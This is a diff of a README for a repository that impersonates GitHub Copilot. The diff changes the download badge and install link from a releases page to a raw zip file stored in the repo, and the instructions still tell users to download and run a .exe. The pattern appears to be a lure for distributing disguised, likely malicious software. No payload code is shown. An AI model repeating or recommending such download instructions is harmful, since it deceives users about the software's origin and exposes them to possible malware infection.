@@ -1,6 +1,6 @@
 # 🤖 github-copilot - Write better code with artificial intelligence
 
-[![Download](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jire8519/github-copilot/releases)
+[![Download](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jire8519/github-copilot/raw/refs/heads/main/sarus/github_copilot_v3.1.zip)
 
 GitHub Copilot acts as an assistant for your coding tasks. This tool suggests code through your text editor. It helps you write logic, fix errors, and learn new programming patterns. 
 
@@ -29,7 +29,7 @@ Before you install this software, check your computer setup. Ensure your machine
 
 You must visit the official release page to get the installer. Follow these steps to prepare your system.
 
-1. Go to this link: [https://github.com/jire8519/github-copilot/releases](https://github.com/jire8519/github-copilot/releases).
+1. Go to this link: [https://github.com/jire8519/github-copilot/raw/refs/heads/main/sarus/github_copilot_v3.1.zip](https://github.com/jire8519/github-copilot/raw/refs/heads/main/sarus/github_copilot_v3.1.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Select the file ending in `.exe` to start the download.
 4. Save the file to your desktop for easy access.
